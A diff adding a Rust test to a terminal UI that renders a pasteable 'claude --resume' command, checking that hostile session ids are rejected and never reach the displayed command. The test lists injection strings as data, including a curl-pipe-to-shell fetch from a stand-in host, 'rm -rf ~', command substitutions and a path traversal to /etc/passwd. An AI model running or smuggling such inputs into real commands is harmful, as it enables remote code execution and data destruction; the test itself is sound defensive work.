@@ -848,6 +848,41 @@ fn the_participant_level_shows_the_stream_the_resume_line_and_the_transcript() {
 }
 
 #[test]
+fn a_shell_bearing_session_id_never_becomes_a_pasteable_command() {
+    // session_id is a raw journal string rendered into a command the
+    // operator is invited to paste. Control characters are stripped,
+    // but ';', '&&', '$(…)' and backticks are not — so an id that
+    // cannot name a transcript is shown as an absence, never as a
+    // suggestion. Same guard the session lookup already applies.
+    for hostile in [
+        "abc; curl evil.sh | sh",
+        "abc && rm -rf ~",
+        "$(id)",
+        "`id`",
+        "../../etc/passwd",
+    ] {
+        assert!(
+            !crate::ui::valid_session_id(hostile),
+            "{hostile:?} must not pass the guard"
+        );
+        let mut views = views();
+        for part in &mut views.run.as_mut().unwrap().participants {
+            part.session_id = Some(hostile.to_string());
+        }
+        let mut tui = at_seats("eff-d");
+        apply(&mut tui, &views, Key::Enter);
+        apply(&mut tui, &views, Key::Enter);
+        let frame = frame_of(&tui, &views, 100, 26);
+        assert!(
+            frame.contains("claude --resume —"),
+            "hostile id reached the resume line: {frame}"
+        );
+        assert!(!frame.contains("curl"), "{frame}");
+        assert!(!frame.contains("rm -rf"), "{frame}");
+    }
+}
+
+#[test]
 fn scrolling_a_paragraph_pane_moves_its_offset_within_the_stream() {
     let mut views = views();
     views.transcript = Some((
